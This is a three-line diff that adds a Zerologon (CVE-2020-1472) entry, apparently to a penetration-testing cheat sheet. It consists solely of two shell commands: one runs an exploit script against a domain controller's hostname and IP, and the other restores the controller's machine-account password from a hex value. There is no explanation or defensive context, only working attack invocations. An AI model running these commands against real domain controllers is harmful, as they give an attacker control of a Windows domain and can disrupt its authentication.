@@ -1,0 +1,3 @@
+# Zerologon — CVE-2020-1472
+python3 cve-2020-1472-exploit.py $DC_HOSTNAME $DC_IP
+python3 restorepassword.py $DOMAIN/$DC_HOSTNAME@$DC_HOSTNAME -target-ip $DC_IP -hexpass $HEX_PASS
